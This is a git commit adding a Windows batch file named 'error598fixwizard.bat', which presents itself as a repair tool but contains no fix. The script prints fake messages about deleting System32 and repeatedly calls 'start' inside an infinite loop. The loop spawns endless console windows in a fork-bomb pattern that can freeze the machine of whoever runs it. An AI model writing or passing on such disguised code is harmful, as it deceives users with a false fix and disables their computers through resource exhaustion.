a6fe25c13a7b0a81dd43116ba22c33c6c708fac4
IAmDefinitelyNotARobot <adrian.waite@students.puyallupsd.org>
2019-06-08 20:37:00 -0700

    .

---
+++ error598fixwizard.bat
@@ -0,0 +1,152 @@
+@echo off
+:a
+echo for i in System32
+echo delete i!
+echo Running...
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+start
+echo delete i!
+goto a
